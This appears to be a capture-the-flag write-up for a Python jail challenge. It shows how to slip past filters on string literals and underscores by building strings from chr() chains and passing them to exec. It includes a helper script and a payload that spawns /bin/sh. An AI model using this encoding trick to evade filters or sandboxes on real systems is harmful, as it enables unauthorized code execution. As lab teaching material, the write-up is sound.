
Tags: **Miscellaneous**, **Medium**

### Challenge
In search of the ancient relic, you go looking for the Pharaoh's tomb inside the pyramids. A giant granite block falls and blocks your exit, and the walls start closing in! You are trapped. Can you make it out alive and continue your quest?

### Downloadable Files
[link](files/nehebkaus-trap)

### Solution

A good challenge, and what you were expected to do is design a jail break from a python REPL.
##### REPL
So, what I did first, was try to understand what kind of interactive interface we were dealing with - i tried `ls`, and it gave me an error, and submitting that to google, all results pointed to `python`
##### Commands
I tried a couple of python commands, and characters, and I made a list, which would help me know which programs I might use to escape the jail i.e.
```
cmds => bin,help,id,import,dir,globals,print,eval,str,exec,ord,sys
chars => {}<>TAB|()*[]=:+@!#$%^\-?
```
##### Thinking...
I thought for a while, tried to google stuff, and after a number of trial and errors, I knew I had to find a way to use numbers to craft a solution, because strings were restricted, and i couldn't use even underscores.
That's when I remembered..chr,ord..which funny enough, I had thought about but I couldn't conceptualize a working solution..playing around with it on a separate REPL, that's when this hit me - i could use **chr()** to produce chars and use **+** to join these characters and produce a **string**!!

Now everything was easier - since `exec` was enabled, I could run system commands with it i.e.
`exec('import os; os.system("ls -la"))'`

Here is the script to help out with printing the character chain:
```python
import sys

try:
        ss = sys.argv[1]
except:
        print("Error")
        exit(0)

result = ""
for s in ss:
        result+=(f"chr({ord(s)})+")

print(result[:-1])
```

to try directory listing, i run this script (`script.py`) as follows:
```python
python script.py "import os; os.system('/bin/sh')"
```
this printed some `chr(<DIGIT>)+` chain which I passed to our program and had code execution.

### Screenshots
![Screenshot_20230320_004526](https://user-images.githubusercontent.com/74212182/226214493-9d84f430-08e1-4593-8c78-feebd38a0fec.png)

![Screenshot_20230320_004839](https://user-images.githubusercontent.com/74212182/226214516-0b243579-cb4a-4c0b-b7fb-9ed69b7799cc.png)

![Screenshot_20230320_005226](https://user-images.githubusercontent.com/74212182/226214521-b4a09733-1c93-4b43-8a47-ba3f4a75a1c6.png)

![Screenshot_20230320_005309](https://user-images.githubusercontent.com/74212182/226214525-3959f297-7fff-4ea1-8281-b3cf7d85c908.png)
